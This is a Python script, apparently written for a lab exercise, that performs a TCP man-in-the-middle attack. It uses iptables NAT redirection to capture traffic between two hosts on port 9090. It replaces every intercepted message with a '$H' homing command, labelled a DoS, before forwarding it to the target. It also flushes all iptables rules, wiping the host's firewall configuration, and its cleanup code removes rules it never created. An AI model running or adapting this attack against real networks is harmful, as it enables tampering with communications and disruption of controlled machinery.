import socket, os, time, signal, atexit
from scapy.all import *

print("Starting real-time TCP MITM with raw sockets and iptables...")

# Cleanup logic for exit
def cleanup():
    print("Cleaning up resources...")
    os.system("iptables -D INPUT -s 10.9.0.5 -p tcp --dport 9090 -j DROP 2>/dev/null")
    os.system("iptables -D FORWARD -s 10.9.0.5 -p tcp --dport 9090 -j DROP 2>/dev/null")

atexit.register(cleanup)

# Signal Handler for graceful exit
def signal_handler(sig, frame):
    print("Interrupt received. Exiting gracefully...")
    sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# Setup logic for IPtables
def setup_iptables():
    print("Setting up iptables rules...")
    # Clean existing rules
    os.system("iptables -F")  
    # Enable IP forwarding
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    # Redirect packets to a local port  //Instead of dropping packets, redirect them to a local port we'll listen on
    os.system("iptables -t nat -A PREROUTING -s 10.9.0.5 -d 10.9.0.6 -p tcp --dport 9090 -j REDIRECT --to-port 9091")
    print("Iptables setup complete")

# Recieve & Modify Packet
def receive_and_modify():
    # Create a socket to listen for redirected traffic
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', 9091))
    sock.listen(5)
    
    print("Listening for redirected traffic on port 9091...")
    
    while True:
        client_sock, addr = sock.accept()
        print(f"\nConnection from {addr}")
        
        # Read data from the connection
        data = client_sock.recv(4096)
        if not data:
            client_sock.close()
            continue
        
        try:
            # Decode and modify the payload
            payload = data.decode(errors='ignore').strip()
            print(f"Intercepted: {payload}")
            
            
            ### MITM MODIFICATION ###
            # DoS by replacing all messages with Homing Command
            modified_payload = f"$H\n"
            modified_data = modified_payload.encode()
            print(f"Initiating DoS Command: $H")
            print(f"Forwarding to HostB: {modified_payload}")
  
            
            # Forward modified data to the actual destination
            forward_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            forward_sock.connect(('10.9.0.6', 9090))
            forward_sock.send(modified_data)
            print(f"Paylaod sent to HostB")
            
            # Clean up
            forward_sock.close()
            client_sock.close()
            
        except Exception as e:
            print(f"Error processing connection: {e}\n")
            client_sock.close()


# Set up iptables
setup_iptables()

try:
    # Start listening and forwarding
    receive_and_modify()
except KeyboardInterrupt:
    print("\nStopping...")
finally:
    # Clean up iptables rules
    os.system("iptables -F")
    os.system("iptables -t nat -F")
    print("Cleaned up iptables rules")
